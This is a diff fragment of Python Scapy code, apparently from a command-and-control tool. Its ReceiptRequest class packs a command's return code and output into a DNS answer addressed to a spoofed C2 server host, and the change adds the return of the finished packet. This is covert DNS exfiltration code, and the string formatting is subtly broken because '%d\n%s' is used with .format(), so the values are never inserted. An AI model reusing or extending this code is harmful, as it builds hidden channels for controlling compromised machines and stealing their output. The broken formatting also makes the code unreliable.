@@ -21,6 +21,8 @@ class ReceiptRequest:
             qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST, qtype=RequestType.RECEIPT.value),
             an=DNSRR(rrname=self.cmd, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata="%d\n%s".format(self.retcode, self.output))
         )
+
+        return ether/ip/udp/dns
     
     def send(self):
         print(self.build().show())
